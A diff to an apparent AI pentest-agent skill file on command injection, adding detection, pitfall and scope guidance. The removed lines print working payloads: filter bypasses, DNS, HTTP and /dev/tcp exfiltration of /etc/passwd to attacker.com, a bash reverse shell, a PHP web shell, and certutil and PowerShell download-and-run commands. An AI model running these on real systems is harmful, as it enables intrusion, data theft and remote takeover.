@@ -1,4 +1,4 @@
----
+﻿---
 name: command-injection-advanced
 description: "Advanced command injection with filter bypass, encoding tricks, OOB exfiltration, and polyglot payloads"
 category: specialized
@@ -40,85 +40,38 @@ Before any injection test, call `getCapturedHeaders` to retrieve session tokens,
 
 The Internal Field Separator (`$IFS`) acts as whitespace in bash when spaces are filtered:
 
-```
-cat${IFS}/etc/passwd
-ls${IFS}-la${IFS}/tmp
-who${IFS}ami
-ping${IFS}-c${IFS}1${IFS}127.0.0.1
-```
 
 Alternative IFS values:
 
-```
-cat$IFS'/'etc'/'passwd
-cat${IFS}<'/etc/passwd'
-ls${IFS}$'\x2d'la
-```
 
 ### Hex Encoding
 
 Bypass character filters using hex-encoded command strings:
 
-```
-$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
-`printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
-/bin/bash -e <<< $(echo "636174202f6574632f706173737764" | xxd -r -p)
-```
 
 ### Octal Encoding
 
-```
-$(printf "\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144")
-`printf "\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144"`
-```
 
 ### Wildcards
 
 Use glob wildcards to construct commands without using the actual characters:
 
-```
-/?in/?d            → /bin/id
-/???/??t ???/???s*  → /cat /etc/passwd (limited)
-cat /etc/p?sswd
-cat /etc/p[abc]sswd
-ls /b?n/id
-/b?n/sh -c "id"
-```
 
 ### Brace Expansion
 
 Bash brace expansion bypasses space and keyword filters:
 
-```
-{cat,/etc/passwd}
-{ls,-la,/tmp}
-{ping,-c,1,127.0.0.1}
-{wget,http://evil.com/shell.sh}
-```
 
 Combined with IFS:
 
-```
-{cat,$IFS/etc/passwd}
-{ls,$IFS-la}
-```
 
 ### Null Byte Injection
 
 Null bytes may truncate strings in certain parsers while passing validation:
 
-```
-cat%00/etc/passwd
-id%00
-/bin/ca%74/etc/passwd
-```
 
 PHP-specific null byte handling:
 
-```
-id%00;id
-id\x00||id
-```
 
 ## Blind Exfiltration Techniques
 
@@ -127,59 +80,28 @@ id\x00||id
 When no output is returned, exfiltrate data via DNS queries:
 
 **Linux:**
-```
-cat /etc/passwd | base64 | tr -d '\n' | sed 's/.\{63\}/&./g' | while read line; do nslookup "$line.attacker.com"; done
-```
 
 **Simplified DNS leak:**
-```
-host $(whoami).attacker.com
-nslookup $(whoami).attacker.com
-dig $(whoami).attacker.com
-```
 
 **PHP-specific:**
-```
-php -r "system('nslookup '.base64_encode(file_get_contents('/etc/passwd')).'.attacker.com');"
-```
 
 ### HTTP Exfiltration
 
 Exfiltrate data via HTTP requests to an external server:
 
 **Using curl:**
-```
-curl http://attacker.com/$(cat /etc/passwd | base64 | tr -d '\n')
-curl -d "$(cat /etc/passwd)" http://attacker.com/exfil
-wget "http://attacker.com/$(whoami)"
-```
 
 **Using Python:**
-```
-python -c "import urllib.request; urllib.request.urlopen('http://attacker.com/'+__import__('os').popen('id').read())"
-```
 
 **Using Node.js:**
-```
-node -e "require('http').get('http://attacker.com/'+require('child_process').execSync('id'))"
-```
 
 ### File-Based Exfiltration
 
 Write output to a file that can be retrieved through a web-accessible directory:
 
-```
-id > /var/www/html/shell-output.txt
-whoami > /tmp/output.txt
-cat /etc/passwd > /var/www/uploads/output.txt
-```
 
 Combined with web server access:
 
-```
-echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/shell.php
-curl http://target/shell.php?cmd=id
-```
 
 ## Time-Based Detection
 
@@ -187,102 +109,47 @@ When no output channel exists, use timing to confirm injection:
 
 ### Sleep-Based
 
-```
-sleep 5
-sleep${IFS}5
-{sleep,5}
-ping -c 5 127.0.0.1
-ping -n 5 127.0.0.1
-```
 
 ### Conditional Timing
 
 Only sleep if a condition is true:
 
-```
-[ $(whoami) = "root" ] && sleep 5
-test $(id -u) -eq 0 && sleep 5
-if [ -f /etc/shadow ]; then sleep 5; fi
-```
 
 ### Timing-Based Data Extraction
 
 Extract data bit by bit using timing:
 
-```
-if [ "$(cat /etc/passwd | head -1 | cut -c1)" = "r" ]; then sleep 5; fi
-```
 
 ### /dev/tcp Blind Channel
 
 Bash `/dev/tcp` for blind data transfer:
 
-```
-cat /etc/passwd > /dev/tcp/attacker.com/4444
-id > /dev/tcp/attacker.com/4444
-```
 
 Reverse shell via `/dev/tcp`:
 
-```
-bash -i >& /dev/tcp/attacker.com/4444 0>&1
-```
 
 ## Encoding Techniques
 
 ### Hex Encoding
 
-```
-echo -e "\x69\x64"                    → id
-printf "\x69\x64"                     → id
-/bin/bash -c $'\x69\x64'
-```
 
 ### Octal Encoding
 
-```
-echo -e "\151\144"                    → id
-printf "\151\144"                     → id
-```
 
 ### Unicode Encoding
 
-```
-echo -e "\u0069\u0064"                → id
-printf '\u0069\u0064'
-```
 
 ### Base64 Encoding
 
-```
-echo aWQ= | base64 -d | bash          → id
-bash -c $(echo aWQ= | base64 -d)
-/bin/bash -e <<< $(echo aWQ= | base64 -d)
-```
 
 ### Subshell / Command Substitution
 
-```
-$(id)
-`id`
-$(whoami)
-$(cat /etc/passwd)
-$(curl http://attacker.com/$(whoami))
-```
 
 ### Variable Expansion
 
-```
-a=i;b=d;$a$b
-x=whoami;${x}
-cmd=id;${cmd}
-```
 
 ### Arithmetic Expansion
 
-```
-$((64+8))    → 72 (not useful alone, but bypasses digit filters in some contexts)
-```
 
 ## Alternative Delimiters
 
@@ -307,19 +174,9 @@ Different shells and execution contexts support various command separators:
 
 URL-encoded newline to inject new commands:
 
-```
-id%0acat /etc/passwd
-id%0d%0acat /etc/passwd
-id%0a./shell.sh
-```
 
 ### Pipe Chains
 
-```
-id | base64
-cat /etc/passwd | base64 | tr -d '\n'
-whoami | curl -d @- http://attacker.com/
-```
 
 ## OS-Specific Differences
 
@@ -344,19 +201,9 @@ whoami | curl -d @- http://attacker.com/
 - Pipe and redirect: same as Linux but with `findstr` instead of `grep`
 
 **Windows-specific bypasses:**
-```
-powershell -e <base64>
-cmd /c "whoami"
-cmd.exe /c "type C:\Windows\System32\drivers\etc\hosts"
-certutil -urlcache -split -f http://attacker.com/shell.exe C:\temp\shell.exe
-```
 
 ### PowerShell Encoding
 
-```
-powershell -EncodedCommand <base64>
-powershell IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')
-```
 
 ## Polyglot Payloads
 
@@ -364,35 +211,20 @@ Payloads designed to execute across multiple injection contexts:
 
 ### Multi-Context Polyglot
 
-```
-;id;`id`;$(id)|id&&id||id
-```
 
 Works with: semicolons, backticks, subshell, pipes, logical operators.
 
 ### SQL + Command Injection Polyglot
 
-```
-1' OR 1=1; system('id'); //
-```
 
 ### XSS + Command Injection Polyglot
 
-```
-"><script>alert(1)</script>$(id)
-```
 
 ### Template + Command Injection Polyglot
 
-```
-{{7*7}}$(id)${7*7}
-```
 
 ### Universal Blind Polyglot
 
-```
-;sleep 5;`sleep 5`;$(sleep 5)|sleep 5&&sleep 5||sleep 5
-```
 
 Detects which delimiter the target processes by timing each variant.
 
@@ -423,3 +255,25 @@ For every confirmed command injection finding, record via `writeFinding`:
 - **Impact**: RCE, file read, file write, reverse shell, or data exfiltration
 - **Request/Response**: Full HTTP exchange via `recordEvidence`
 - **Timing**: If time-based, include request start, end, and delta
+
+## Trigger Conditions
+
+Activate when user input reaches an OS command execution sink — `system`/`exec`/`popen`/`shell_exec`/`Runtime.exec`/`ProcessBuilder`/`subprocess`/`child_process` — or when the app performs file/network/system tasks parameterized by user data (filename processing, ping/traceroute-style tools, PDF/image conversion, archive extraction). Trigger on blind endpoints where output is suppressed but timing, DNS, or file-write side effects are observable, and on WAF/allowlist/regex-filtered inputs needing bypass. Do not trigger on SQL/template/JSON-parser sinks (those are separate skills) or pure client-side JS execution.
+
+## Detection Approach
+
+First decide if the input reaches a shell or direct exec: send a benign delimiter (`;`, `&&`, `|`, newline) with a harmless command and compare output/status to a baseline. If output returns, classify the shell (Linux vs Windows by available commands) and the separators it honors. For blind sinks, pivot to out-of-band and timing: a DNS/HTTP callback carrying `whoami` output, or a measured `sleep` delay, proves execution even without visible output. When filters block keywords or characters (spaces, slashes, letters), escalate through bypass families in order of subtlety: IFS/whitespace substitution, then encoding (hex/octal/base64/`printf`), then wildcards and brace expansion, then variable/arithmetic concatenation, then polyglots that span multiple delimiters. Always prove a bypass by showing the original payload fails while the transformed one succeeds on the *same* endpoint. Reserve reverse-shell/file-write exfil only for confirmed execution with explicit scope.
+
+## Pitfalls
+
+- Claiming execution from a generic error or 500 — an error is not output; require `uid=`/`whoami` evidence or a callback.
+- Single timing sample treated as blind confirmation — network jitter mimics sleep; repeat and compare true vs false conditions.
+- Assuming bash on Windows and vice versa — separator and command semantics differ; confirm OS first.
+- Overclaiming filter bypass from one success without showing the blocked variant fail on the same endpoint.
+- Treating reflected input as RCE — the literal payload string appearing in a page is not command output.
+- Null-byte tricks that fail on modern kernels (Linux rejects them); don't rely on them.
+- Reverse shells/file writes without scope authorization — keep PoCs read-only/safe.
+
+## Verification & Impact
+
+CONFIRMED when the response shows actual command output (`uid=`, `whoami` value, or file contents) or an observed OAST callback/measured timing delta proves execution. SUSPECTED when only a status shift or single timing blip occurs with no second confirmation — record as candidate. Document impact by capability proven: arbitrary command execution (RCE), file read/write, data exfiltration (DNS/HTTP/file-based), or reverse-shell access; name the OS, shell, and filter bypass used. Capture full request/response and timing via `recordEvidence`.
